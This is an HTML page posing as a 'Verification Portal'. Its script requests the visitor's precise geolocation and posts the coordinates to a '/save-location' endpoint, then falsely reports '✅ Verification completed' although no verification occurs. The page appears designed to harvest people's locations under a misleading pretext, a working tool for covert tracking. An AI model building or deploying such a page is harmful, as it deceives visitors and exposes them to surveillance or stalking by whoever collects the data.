<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Verification Portal</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}

body{
    background:#f5f7fa;
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;
}

.card{
    width:100%;
    max-width:400px;
    background:#fff;
    padding:30px;
    border-radius:20px;
    box-shadow:0 5px 20px rgba(0,0,0,.1);
    text-align:center;
}

h2{
    margin-bottom:15px;
}

p{
    color:#666;
    margin-bottom:20px;
}

button{
    width:100%;
    border:none;
    padding:14px;
    border-radius:10px;
    background:#2563eb;
    color:white;
    font-size:16px;
    cursor:pointer;
}

button:hover{
    opacity:.9;
}

.loader{
    display:none;
    width:60px;
    height:60px;
    border:6px solid #ddd;
    border-top:6px solid #2563eb;
    border-radius:50%;
    margin:20px auto;
    animation:spin 1s linear infinite;
}

@keyframes spin{
    100%{
        transform:rotate(360deg);
    }
}

#status{
    margin-top:15px;
    font-size:16px;
}
</style>
</head>

<body>

<div class="card">

    <h2>Collect Info</h2>

    <p>
        Basic information may be collected for verification.
    </p>

    <button onclick="startVerification()">
        Continue
    </button>

    <div class="loader" id="loader"></div>

    <div id="status"></div>

</div>

<script>

function startVerification(){

    document.getElementById("loader").style.display = "block";

    document.getElementById("status").innerHTML =
        "Requesting permission...";

    getLocation();
}

function getLocation() {

    let statusBox = document.getElementById("status");

    if (!navigator.geolocation) {

        statusBox.innerHTML =
            "Geolocation not supported.";

        return;
    }

    navigator.geolocation.getCurrentPosition(

        function(position){

            statusBox.innerHTML =
                "Sending location...";

            fetch('/save-location', {

                method:'POST',

                headers:{
                    'Content-Type':'application/json'
                },

                body:JSON.stringify({
                    latitude:position.coords.latitude,
                    longitude:position.coords.longitude,
                    accuracy:position.coords.accuracy
                })

            })

            .then(response => response.json())

            .then(data => {

                document.getElementById("loader").style.display =
                    "none";

                statusBox.innerHTML =
                    "✅ Verification completed.";

            });

        },

        function(error){

            document.getElementById("loader").style.display =
                "none";

            let msg = "Permission denied";

            if(error.code === 2){
                msg = "Location unavailable";
            }

            if(error.code === 3){
                msg = "Request timeout";
            }

            statusBox.innerHTML =
                "❌ " + msg;

        },

        {
            enableHighAccuracy:true,
            timeout:15000,
            maximumAge:0
        }

    );
}
</script>

</body>
</html>
